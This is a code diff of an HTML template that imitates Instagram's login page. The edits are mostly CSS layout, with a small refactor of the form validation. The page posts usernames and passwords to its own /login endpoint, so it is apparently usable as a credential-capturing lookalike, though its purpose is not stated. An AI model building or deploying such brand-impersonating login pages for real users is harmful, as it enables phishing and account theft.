@@ -10,24 +10,40 @@
       background-color: #fafafa;
       font-family: Arial, sans-serif;
     }
+
     .container {
       display: flex;
-      min-height: 100vh;
+      flex-direction: column;
     }
+
     .left-image {
-      flex: 1;
-      background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png');
+      display: none;
+      background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvzUKJ76Qe5oxTm2TCMU819FCn3GpxCXUKQw&usqp=CAU');
       background-size: cover;
       background-position: center;
-      display: none;
-    }
-    .right-form {
       flex: 1;
+    }
+
+    @media(min-width: 768px) {
+      .container {
+        flex-direction: row;
+        min-height: 100vh;
+      }
+      .left-image {
+        display: block;
+      }
+      .right-form {
+        flex: 1;
+      }
+    }
+
+    .right-form {
       display: flex;
       flex-direction: column;
       align-items: center;
       padding: 40px 20px;
     }
+
     .login-container {
       max-width: 350px;
       width: 100%;
@@ -37,11 +53,13 @@
       text-align: center;
       margin-bottom: 10px;
     }
+
     .logo img {
       width: 180px;
       margin-bottom: 20px;
       object-fit: contain;
     }
+
     input {
       width: 100%;
       padding: 10px;
@@ -50,13 +68,16 @@
       border-radius: 3px;
       background-color: #fafafa;
     }
+
     .password-field {
       position: relative;
       width: 100%;
     }
+
     .password-field input {
       padding-right: 60px;
     }
+
     .toggle-password {
       position: absolute;
       right: 10px;
@@ -69,6 +90,7 @@
       cursor: pointer;
       user-select: none;
     }
+
     button {
       width: 100%;
       padding: 10px;
@@ -80,10 +102,12 @@
       font-weight: bold;
       cursor: pointer;
     }
+
     button:disabled {
       background-color: #b2dffc;
       cursor: not-allowed;
     }
+
     .divider {
       display: flex;
       align-items: center;
@@ -92,18 +116,22 @@
       color: #8e8e8e;
       font-size: 13px;
     }
+
     .divider::before,
     .divider::after {
       content: '';
       flex: 1;
       border-bottom: 1px solid #dbdbdb;
     }
+
     .divider:not(:empty)::before {
       margin-right: 10px;
     }
+
     .divider:not(:empty)::after {
       margin-left: 10px;
     }
+
     .fb-login {
       background-color: #4267b2;
       text-decoration: none;
@@ -114,15 +142,18 @@
       font-weight: bold;
       margin-top: 10px;
     }
+
     .forgot {
       margin-top: 15px;
       font-size: 12px;
     }
+
     .forgot a {
       color: #00376b;
       text-decoration: none;
       font-weight: bold;
     }
+
     .signup {
       text-align: center;
       margin-top: 20px;
@@ -131,17 +162,20 @@
       background-color: #fff;
       font-size: 14px;
     }
+
     .signup a {
       color: #3897f0;
       text-decoration: none;
       font-weight: bold;
     }
+
     .get-app {
       text-align: center;
       font-size: 14px;
       color: #262626;
       margin-top: 20px;
     }
+
     .app-badges {
       margin-top: 10px;
       display: flex;
@@ -149,22 +183,19 @@
       gap: 10px;
       flex-wrap: wrap;
     }
+
     .app-badges img {
       height: 40px;
       max-width: 140px;
       width: auto;
       object-fit: contain;
     }
+
     footer {
       text-align: center;
       padding: 20px;
       font-size: 12px;
       color: #8e8e8e;
-    }
-    @media(min-width: 768px) {
-      .left-image {
-        display: block;
-      }
     }
   </style>
 </head>
@@ -177,7 +208,7 @@
           <img src="https://www.pngarts.com/files/4/Instagram-PNG-Background-Image.png" alt="Instagram Logo">
         </div>
         {% if error %}
-          <div class="error-message">{{ error }}</div>
+        <div class="error-message">{{ error }}</div>
         {% endif %}
         <form id="loginForm" action="/login" method="POST">
           <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
@@ -220,11 +251,7 @@
     function validateForm() {
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
-      if (email !== '' && password.length >= 6) {
-        loginBtn.disabled = false;
-      } else {
-        loginBtn.disabled = true;
-      }
+      loginBtn.disabled = !(email !== '' && password.length >= 6);
     }
 
     emailInput.addEventListener('input', validateForm);
